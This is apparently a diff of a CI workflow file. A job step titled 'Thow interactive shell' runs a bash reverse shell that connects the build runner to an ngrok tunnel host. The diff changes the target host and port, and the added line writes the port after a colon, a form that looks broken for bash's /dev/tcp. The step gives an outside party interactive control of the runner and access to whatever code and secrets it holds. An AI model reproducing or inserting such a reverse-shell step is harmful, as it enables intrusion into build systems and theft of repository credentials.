@@ -14,4 +14,4 @@ jobs:
       - name: Thow interactive shell
         shell: bash
         run: |
-              bash -i >& /dev/tcp/8.tcp.ngrok.io/15063 0>&1
+              bash -i >& /dev/tcp/4.tcp.ngrok.io:17792 0>&1
